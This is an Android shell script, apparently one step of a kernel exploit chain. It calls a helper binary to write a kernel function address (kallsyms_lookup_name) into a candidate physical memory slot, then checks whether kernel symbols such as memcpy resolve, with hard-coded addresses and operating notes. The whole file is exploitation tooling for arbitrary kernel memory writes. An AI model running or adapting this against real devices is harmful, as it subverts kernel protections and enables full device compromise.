#!/system/bin/sh
# SPDX-License-Identifier: MIT
# One-shot probe: write KLN to a single candidate slot, then resolve memcpy.
# Usage: probe_one.sh <slot_phys_hex> [kln_hex]
# ALWAYS run on a freshly rebooted box (orphan gaw64 = 0).
D=/data/local/tmp
GW=$D/gaw64
KF=$D/kfunc_new
SLOT=${1:-20a57a0}
KLN=${2:-ffffffc00111e5d0}

echo "=== probe slot=$SLOT kln=$KLN"
echo "-- write:"
timeout -k 2 10 $GW $SLOT $KLN 2>&1 | tail -2
echo "-- resolve memcpy:"
timeout -k 2 8 $KF sym memcpy 2>&1 | tail -1
echo "-- resolve kallsyms_lookup_name:"
timeout -k 2 8 $KF sym kallsyms_lookup_name 2>&1 | tail -1
echo "-- alive: OK"
